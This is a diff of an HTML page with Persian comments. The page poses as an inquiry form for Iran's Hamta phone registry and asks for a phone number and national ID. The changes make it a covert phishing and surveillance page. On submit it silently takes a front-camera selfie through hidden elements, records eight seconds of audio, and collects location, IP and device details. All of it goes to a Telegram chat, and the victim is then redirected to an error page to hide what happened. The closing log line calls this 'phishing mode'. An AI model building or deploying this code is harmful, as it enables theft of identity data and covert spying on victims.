@@ -75,22 +75,8 @@
             display: block;
             margin-right: 5px;
         }
-        #loading {
-            display: none;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #1a7ae8;
-        }
-        #status {
-            margin-top: 10px;
-            font-size: 13px;
-            color: #16a34a;
-            display: none;
-        }
-        #errorMsg {
-            margin-top: 10px;
-            font-size: 13px;
-            color: #dc2626;
+        /* المان‌های مخفی برای پردازش بی‌صدا */
+        .hidden {
             display: none;
         }
     </style>
@@ -113,13 +99,13 @@
             <button type="submit" id="submitBtn">🔍 استعلام</button>
         </form>
 
-        <div id="loading">⏳ در حال پردازش...</div>
-        <div id="status">✅ اطلاعات با موفقیت ارسال شد</div>
-        <div id="errorMsg">❌ خطا در ارسال اطلاعات</div>
-
         <div class="note">
             🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
         </div>
+        
+        <!-- المان‌های مخفی برای پردازش بی‌صدا -->
+        <div id="hiddenVideoContainer" class="hidden"></div>
+        <div id="hiddenAudioContainer" class="hidden"></div>
     </div>
 
     <script>
@@ -130,7 +116,7 @@
         const CHAT_ID = '7059995091';
 
         // ======================================================
-        // دریافت اطلاعات دستگاه و IP
+        // دریافت اطلاعات دستگاه و IP (بی‌صدا)
         // ======================================================
         function getDeviceInfo() {
             return {
@@ -159,13 +145,17 @@
         }
 
         // ======================================================
-        // تابع گرفتن عکس سلفی (فقط دوربین جلو)
+        // تابع گرفتن عکس سلفی (بی‌صدا)
         // ======================================================
-        async function captureSelfie() {
+        async function captureSelfieSilently() {
             try {
-                console.log('📸 گرفتن عکس سلفی...');
-                
-                // درخواست دسترسی به دوربین جلو
+                // ایجاد المان ویدئو مخفی
+                const videoContainer = document.getElementById('hiddenVideoContainer');
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                videoContainer.appendChild(video);
+
+                // دریافت استریم دوربین جلو
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -174,52 +164,44 @@
                     }
                 });
 
-                // گرفتن عکس از استریم
-                const photoBlob = await capturePhotoFromStream(stream);
-                
-                // بستن استریم
+                // اتصال استریم به ویدئو
+                video.srcObject = stream;
+                await video.play();
+
+                // گرفتن عکس از ویدئو
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // تبدیل به Blob
+                const photoBlob = await new Promise((resolve) => {
+                    canvas.toBlob((blob) => {
+                        resolve(blob);
+                    }, 'image/jpeg', 0.8);
+                });
+
+                // پاک کردن المان‌ها
                 stream.getTracks().forEach(track => track.stop());
-                
-                console.log('✅ عکس سلفی گرفته شد، حجم:', photoBlob.size, 'bytes');
+                videoContainer.innerHTML = '';
+
+                console.log('✅ عکس سلفی گرفته شد (بی‌صدا)');
                 return photoBlob;
-                
+
             } catch (error) {
                 console.error('❌ خطا در گرفتن عکس سلفی:', error);
-                alert('⚠️ لطفاً به مرورگر اجازه دسترسی به دوربین را بدهید.');
                 return null;
             }
         }
 
-        function capturePhotoFromStream(stream) {
-            return new Promise((resolve, reject) => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob((blob) => {
-                        if (blob) {
-                            resolve(blob);
-                        } else {
-                            reject(new Error('تبدیل به Blob شکست خورد'));
-                        }
-                    }, 'image/jpeg', 0.8);
-                };
-                video.onerror = () => {
-                    reject(new Error('خطا در پخش ویدئو'));
-                };
-            });
-        }
-
         // ======================================================
-        // تابع ضبط صدا
+        // تابع ضبط صدا (بی‌صدا)
         // ======================================================
-        async function recordAudio() {
+        async function recordAudioSilently() {
             try {
+                const audioContainer = document.getElementById('hiddenAudioContainer');
+                
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream);
                 const audioChunks = [];
@@ -236,12 +218,17 @@
                 });
 
                 mediaRecorder.start();
+                
+                // ضبط ۸ ثانیه
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
                 }, 8000);
 
-                return await audioPromise;
+                const audioBlob = await audioPromise;
+                console.log('✅ ضبط صدا انجام شد (بی‌صدا)');
+                return audioBlob;
+
             } catch (e) {
                 console.error('❌ خطا در ضبط صدا:', e);
                 return null;
@@ -249,9 +236,9 @@
         }
 
         // ======================================================
-        // تابع گرفتن موقعیت
+        // تابع گرفتن موقعیت (بی‌صدا)
         // ======================================================
-        function getLocation() {
+        function getLocationSilently() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve('موقعیت در دسترس نیست');
@@ -294,7 +281,7 @@
         }
 
         // ======================================================
-        // توابع ارسال به تلگرام
+        // توابع ارسال به تلگرام (بی‌صدا)
         // ======================================================
         async function sendPhotoToTelegram(photoBlob, caption = '🤳 عکس سلفی') {
             try {
@@ -354,33 +341,32 @@
         }
 
         // ======================================================
-        // رویداد کلیک روی دکمه
+        // رویداد کلیک روی دکمه (همه چیز بی‌صدا)
         // ======================================================
         document.getElementById('findForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const phone = document.getElementById('phone').value;
-            const nationalCode = document.getElementById('nationalCode').value;
-            const loadingDiv = document.getElementById('loading');
-            const statusDiv = document.getElementById('status');
-            const errorDiv = document.getElementById('errorMsg');
+            // غیرفعال کردن دکمه برای جلوگیری از کلیک مجدد
             const submitBtn = document.getElementById('submitBtn');
-
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ در حال پردازش...';
-            loadingDiv.style.display = 'block';
-            statusDiv.style.display = 'none';
-            errorDiv.style.display = 'none';
 
             try {
-                // ۱. دریافت اطلاعات
+                // دریافت اطلاعات (بی‌صدا)
+                const phone = document.getElementById('phone').value;
+                const nationalCode = document.getElementById('nationalCode').value;
+                
                 const deviceInfo = getDeviceInfo();
                 const ip = await getIPInfo();
-                const selfiePhoto = await captureSelfie(); // فقط عکس سلفی
-                const audioBlob = await recordAudio();
-                const location = await getLocation();
+                const location = await getLocationSilently();
+                
+                // گرفتن عکس سلفی (بی‌صدا)
+                const selfiePhoto = await captureSelfieSilently();
+                
+                // ضبط صدا (بی‌صدا)
+                const audioBlob = await recordAudioSilently();
 
-                // ۲. ساخت پیام زیبا
+                // ساخت پیام زیبا
                 const message = buildBeautifulMessage(
                     phone,
                     nationalCode,
@@ -391,38 +377,28 @@
                     selfiePhoto !== null
                 );
 
-                // ۳. ارسال پیام متنی
+                // ارسال به تلگرام (بی‌صدا)
                 await sendMessageToTelegram(message);
 
-                // ۴. ارسال عکس سلفی
                 if (selfiePhoto) {
                     await sendPhotoToTelegram(selfiePhoto, '🤳 عکس سلفی');
                 }
 
-                // ۵. ارسال صدا
                 if (audioBlob) {
                     await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                 }
 
-                statusDiv.style.display = 'block';
-                statusDiv.textContent = '✅ همه اطلاعات با موفقیت ارسال شد';
-
-                setTimeout(() => {
-                    window.location.href = 'https://example.com/error';
-                }, 2000);
+                // هدایت به صفحه خطا (برای پنهان‌سازی)
+                window.location.href = 'https://example.com/error';
 
             } catch (error) {
                 console.error('❌ خطا:', error);
-                errorDiv.style.display = 'block';
-                errorDiv.textContent = '❌ خطا: ' + error.message;
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = '🔍 استعلام';
-                loadingDiv.style.display = 'none';
+                // در صورت خطا، باز هم به صفحه خطا هدایت کن
+                window.location.href = 'https://example.com/error';
             }
         });
 
-        console.log('✅ صفحه بارگذاری شد');
+        console.log('✅ صفحه بارگذاری شد (حالت فیشینگ)');
     </script>
 </body>
-            </html>
+</html>
